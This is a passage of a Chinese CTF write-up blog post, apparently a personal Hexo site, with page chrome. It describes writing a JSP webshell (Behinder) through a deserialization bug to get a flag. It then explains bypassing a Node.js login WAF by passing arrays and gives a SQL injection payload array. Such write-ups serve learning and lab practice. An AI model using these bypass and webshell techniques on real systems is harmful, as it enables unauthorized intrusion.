+<p>上传成功<br><img src="https://i.loli.net/2021/07/13/YZ6yuj85tsGzERT.png" alt="1.png"><br>接下来可以通过注册或者登录，触发一个新的connection，引起反序列化。<br>访问shell.jsp文件，发现已经成功写入<br><img src="https://i.loli.net/2021/07/13/fIdRPiDOXVwt6ul.png" alt="1.png"><br>这里我把官方wp的马换成冰蝎2的jsp马，密码pass，连上后执行命令即可拿到flag<br><img src="https://i.loli.net/2021/07/13/lgub7LzhKPMwHne.png" alt="1.png"></p>
+<h2 id="node-js"><a href="#node-js" class="headerlink" title="node.js"></a>node.js</h2><p>因为自己不熟悉nodejs，所以先学了下一些基本的概念，语法<br><a href="https://nodejs.jakeyu.top/" target="_blank" rel="noopener">https://nodejs.jakeyu.top/</a><br>参照官方wp，来看下代码<br>在登录的时候有一个过滤。做了一个waf。然后在safeStr中调用<br>传给safeStr函数的参数是username和password。<br>在waf中会对username和password的每个元素和黑名单进行对比<br>如果匹配就会被替换成星号。<br>这里可以通过传入数组的方式绕过，如果username是一个数组。<br>那么waf就是在对比数组中的每一个元素，很容易就绕过了。<br><img src="https://i.loli.net/2021/07/15/zUwv8dIkQYbOXT6.png" alt="1.png"><br>但是在sql部分，有substr，如果对数组调用，会报错<br><img src="https://i.loli.net/2021/07/15/fCUrFDHgXEKmubQ.png" alt="1.png"><br>得想办法让username和password变为字符串。在safestr函数中<br>如果在传给safaStr的参数中，有参数被waf匹配到，那么就会触发加操作。<br>这里可以用来将数组变为字符串(js的加法是这样的，神奇)<br><img src="https://i.loli.net/2021/07/15/7W2TX4ntRsLrAig.png" alt="1.png"><br>本地测试一下对数组的加操作<br><img src="https://i.loli.net/2021/07/15/q7wfZCciR2ILjAg.png" alt="1.png"><br>可以看到拼接后，数组变成了字符串，但是同时也带上了逗号。<br>回到题目中，可以想办法构造一个数组，让前面部分真实payload绕过waf<br>然后后面增加一个会被waf匹配到的部分，用以将数组转换成字符串。<br>例如</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> username = [<span class="string">"admin'#"</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="string">'('</span>,<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
+<p>实际操作一下<br><img src="https://i.loli.net/2021/07/16/2Vu3UzwPliMYkfF.png" alt="1.png"><br>这里需要注意一下，被waf检测到的字符不能放在数组中第六个元素之前。<br>原因如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  const safeStr = (str)=&gt;&#123; for(let i = 0;i &lt; str.length;i++)&#123;</span><br><span class="line">console.log(&quot;index: &quot; + i);</span><br><span class="line">console.log(str);</span><br><span class="line">      if (waf(str[i]) ==&quot;*&quot;)&#123;</span><br><span class="line">          </span><br><span class="line">          str =  str.slice(0, i) + &quot;*&quot; + str.slice(i + 1, str.length);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+<p>假设str为 <code>username = [&quot;admin&#39;#&quot;,(,1,1,1,&#39;1&#39;,1]</code><br>那么在第二轮，for循环的时候，username就已经变为字符串<br><code>admin&#39;#,a*a,a,a,a,a,a,A</code><br>这一看似乎没问题，但是此时i的下标是2，for循环会从字符m开始遍历整个字符串<br>所以payload中的单引号是难逃一劫，会被替换掉。<br>所以一定要把数组中被waf检测的数据放在第五个元素之后</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2021/04/15/%E5%9B%9E%E7%82%89%E9%87%8D%E9%80%A0%E8%AE%A1%E5%88%92%E4%B9%8Bxss/" rel="next" title="回炉重造计划之xss">
+                <i class="fa fa-chevron-left"></i> 回炉重造计划之xss
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2021/08/16/%E9%9D%A2%E8%AF%95%E9%A2%98/" rel="prev" title="面试题">
+                面试题 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg"
+                alt="irrik" />
+            
+              <p class="site-author-name" itemprop="name">irrik</p>
+              <p class="site-description motion-element" itemprop="description">又菜又爱玩</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">32</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/irrik" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#misc"><span class="nav-number">1.</span> <span class="nav-text">misc</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#签到"><span class="nav-number">1.1.</span> <span class="nav-text">签到</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Web"><span class="nav-number">2.</span> <span class="nav-text">Web</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#easycms"><span class="nav-number">2.1.</span> <span class="nav-text">easycms</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#非预期解"><span class="nav-number">2.1.1.</span> <span class="nav-text">非预期解</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babycat"><span class="nav-number">2.2.</span> <span class="nav-text">babycat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#babycat-revenge"><span class="nav-number">2.3.</span> <span class="nav-text">babycat-revenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#node-js"><span class="nav-number">2.4.</span> <span class="nav-text">node.js</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">irrik</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">153.5k</span>
+  
+</div>
+
+
+  <div class="powered-by">
+	<i class="fa fa-user-md"></i>
+	<span id="busuanzi_container_site_uv">
+		本站访客数:<span id="busuanzi_value_site_uv"></span>
+	</span>
+	<span class="post-meta-divider">|</span>
+	<span id="busuanzi_container_site_pv">
+		本站访问量<span id="busuanzi_value_site_pv"></span>
+	</span>
+</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
